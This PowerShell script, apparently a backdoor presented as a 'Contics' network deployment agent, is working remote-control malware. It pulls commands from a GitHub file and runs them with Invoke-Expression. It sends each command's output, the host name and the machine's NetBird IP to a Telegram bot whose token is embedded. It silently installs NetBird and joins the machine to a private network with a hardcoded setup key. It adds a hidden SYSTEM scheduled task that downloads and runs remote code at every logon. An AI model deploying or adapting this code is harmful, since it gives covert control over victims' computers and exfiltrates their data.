# ===========================================================================
# SCRIPT DE RED CONTICS 2026 - AGENTE PRO V5.2 (ULTRA-STABLE)
# ===========================================================================

# --- [1] CONFIGURACIÓN DE RUTAS ---
$GitHubRawUrl  = 'https://raw.githubusercontent.com/emerson101293/contics-infra/refs/heads/main/agent-win.ps1'
$TareaUrl      = 'https://raw.githubusercontent.com/emerson101293/contics-infra/refs/heads/main/agent-tasks.txt'
$TelegramToken = '8693420261:AAH0RQ-7LySZ03gglYDYOjJbY1xJonv_fak'
$TelegramChatID = '6902736310'

$mUrl   = 'https://contics-admin.duckdns.org'
$sKey   = '8552E0C2-4E0A-490D-8B93-E2CD69CDC007'
$nbPath = 'C:\Program Files\NetBird\netbird.exe'

function Send-Telegram {
    param([string]$Message)
    try {
        $Url = "https://api.telegram.org/bot$($TelegramToken)/sendMessage"
        $Body = @{ chat_id = $TelegramChatID; text = $Message; parse_mode = 'Markdown' }
        $Json = $Body | ConvertTo-Json -Compress
        $utf8 = [System.Text.Encoding]::UTF8.GetBytes($Json)
        $null = Invoke-RestMethod -Uri $Url -Method Post -Body $utf8 -ContentType "application/json; charset=utf-8"
    } catch { }
}

Write-Host "`n======================================================" -ForegroundColor Cyan
Write-Host "      SISTEMA DE DESPLIEGUE CONTICS 2026" -ForegroundColor Cyan
Write-Host "======================================================" -ForegroundColor Cyan

# --- [2] RECEPTOR DE TAREAS (C2) ---
Write-Host "`n[1/4] Buscando ordenes en GitHub..." -ForegroundColor Yellow
try {
    $TareaData = Invoke-WebRequest -Uri $TareaUrl -UseBasicParsing -ErrorAction SilentlyContinue
    if ($TareaData) {
        $Tarea = $TareaData.Content.Trim()
        if ($Tarea -ne "NONE" -and $Tarea -ne "") {
            $Out = Invoke-Expression $Tarea 2>&1 | Out-String
            
            # Construcción de mensaje simple para evitar errores de codificación
            $MsgC2 = "ORDEN EJECUTADA`n"
            $MsgC2 += "PC: $env:COMPUTERNAME`n"
            $MsgC2 += "Comando: $Tarea`n"
            $MsgC2 += "Resultado: $Out"
            
            Send-Telegram -Message $MsgC2
            Write-Host " [+] Orden procesada." -ForegroundColor Green
        } else {
            Write-Host " [+] Sin ordenes pendientes." -ForegroundColor Gray
        }
    }
} catch { 
    Write-Host " [-] Error en C2" -ForegroundColor Red
}

# --- [3] LOGICA DE RED (NETBIRD) ---
Write-Host "[2/4] Verificando NetBird..." -ForegroundColor Yellow
if (!(Test-Path $nbPath)) {
    $installer = "$env:TEMP\nb.exe"
    Invoke-WebRequest -Uri 'https://github.com/netbirdio/netbird/releases/latest/download/netbird_installer_windows_amd64.exe' -OutFile $installer -UseBasicParsing
    Start-Process -FilePath $installer -ArgumentList '/S', '/component=service' -Wait
    Start-Sleep -Seconds 5
}

& $nbPath down | Out-Null
& $nbPath up --management-url $mUrl --setup-key $sKey | Out-Null
if (Test-Path 'C:\Users\Public\Desktop\NetBird.lnk') { Remove-Item -Path 'C:\Users\Public\Desktop\NetBird.lnk' -Force }

# --- [4] REPORTE DE NODO ---
Write-Host "[3/4] Reportando IP..." -ForegroundColor Yellow
Start-Sleep -Seconds 8
$status = & $nbPath status
$lineaIP = $status | Select-String 'NetBird IP:'

if ($lineaIP) {
    $nbIP = (($lineaIP.ToString() -split ':')[1].Trim() -split '/')[0].Trim()
    $MsgOk = "NODO CONECTADO`nPC: $env:COMPUTERNAME`nIP: $nbIP"
    Send-Telegram -Message $MsgOk
    Write-Host " [+] IP: $nbIP" -ForegroundColor Green
}

# --- [5] PERSISTENCIA ---
Write-Host "[4/4] Configurando Persistencia..." -ForegroundColor Yellow
$TaskName = "Contics_AtLogon"
# Comando simplificado para evitar errores de escape
$ScriptCmd = "iex (iwr '$GitHubRawUrl' -UseBasicParsing)"

Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
$Action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-WindowStyle Hidden -Command `"$ScriptCmd`""
$Trigger = New-ScheduledTaskTrigger -AtLogOn
$Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
$Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest

Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -Principal $Principal | Out-Null

Write-Host "`n------------------------------------------------------" -ForegroundColor Cyan
Write-Host "Proceso Finalizado. Abriendo Panel..." -ForegroundColor Gray
Start-Process $mUrl 
Start-Sleep -Seconds 2
